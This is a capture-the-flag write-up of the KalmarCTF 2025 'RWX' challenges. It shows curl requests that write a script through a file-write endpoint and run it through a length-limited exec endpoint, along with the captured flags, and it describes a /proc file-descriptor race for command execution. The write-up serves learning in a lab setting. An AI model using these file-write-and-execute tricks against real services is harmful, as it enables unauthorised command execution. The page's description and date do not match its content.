---
staticPath: kalmarctf2025
Title: KalmarCTF 2025
Description: How to escape a python jail with only 14 characters
Date: 2024-09-16
---

## RWX - Bronze

I have read write and execute privileges. The goal is to execute the `would` binary with a specific argument to get it to leak the flag. The issue is that for the execute command, it's just piped into subprocess, I'm limited to 7 bytes

```python
if len(cmd) > 7:
	return 'Command too long', 400
```

```
> curl "http://localhost:6664/write?filename=pwn.sh" -d "/would you be so kind to provide me with a flag"
[Errno 13] Permission denied: 'pwn.sh'
```

Let's try writing into /app

```
> curl "http://localhost:6664/write?filename=/app/pwn.sh" -d "/would you be so kind to provide me with a flag"
[Errno 13] Permission denied: '/app/pwn.sh'**%**
```

/tmp?

```
> curl "http://localhost:6664/write?filename=/tmp/pwn.sh" -d "/would you be so kind to provide me with a flag"
OK
```


```
curl "http://localhost:6664/exec?filename=/tmp/pwn.sh"
```

No response :-( That's not even the right syntax. Oops


```
curl "http://localhost:6664/exec?cmd=/tmp/pwn.sh
Command too long
```

lets rewrite it use a shorter filename
```
curl "http://localhost:6664/write?filename=/tmp/p" -d "/would you be so kind to provide me with a flag"
```

```
curl "http://localhost:6664/exec?cmd=/tmp/p
Command too long
```

The trick is how do I actually call my script? Sh is installed. I then realized I could use `.` to run a shell script while reading about bash builtins. I also realized I could use the `~` alias.

```
curl "http://localhost:6664/exec?cmd=~/p"
```

Expands to /home/user/p which I think is useful because its shorter than /tmp

```
curl "http://localhost:6664/write?filename=~p" -d "/would you be so kind to provide me with a flag"
```

I don't think write expands the `~`



```
curl "http://localhost:6664/write?filename=/home/user/p" -d "/would you be so kind to provide me with a flag"
curl "http://localhost:6664/exec?cmd=.%20~/p"
```

Ok


```
curl "https://f2096b4263b0fecaa6c3cacc3e155bba-46857.inst2.chal-kalmarc.tf/write?filename=/home/user/p" -d "/would you be so kind to provide me with a flag"
curl "https://f2096b4263b0fecaa6c3cacc3e155bba-46857.inst2.chal-kalmarc.tf/exec?cmd=.%20~/p"

kalmar{ok_you_demonstrated_your_rwx_abilities_but_let_us_put_you_to_the_test_for_real_now}
```

## RWX - Silver

Same deal as Bronze but I'm limited to 5 bytes. Thankfully, my solve for bronze works for silver!

```
if len(cmd) > 5:
	return 'Command too long', 400
```

```
curl "https://5a655c9cfffbb91c0dbe580f6d3f37a1-56697.inst2.chal-kalmarc.tf/write?filename=/home/user/p" -d "/would you be so kind to provide me with a flag"
curl "https://5a655c9cfffbb91c0dbe580f6d3f37a1-56697.inst2.chal-kalmarc.tf/exec?cmd=.%20~/p"
OKkalmar{impressive_that_you_managed_to_get_this_far_but_surely_silver_is_where_your_rwx_adventure_ends_b4284b024113}
```

Yep

## RWX - Diamond

I didn't solve this problem during the CTF. However, I found the solution pretty interesting. It involved exploiting a race condition in order to execute bash commands. The exec command was limited to 4 bytes. You couldn't use the above solution because the user was created without a home directory. The first request started a sh session with `a|sh` this creates an sh process that lives briefly. The second request writes to `/proc/<pid>/fd/0` which then allows for command execution! Pretty cool and not something I would have thought of.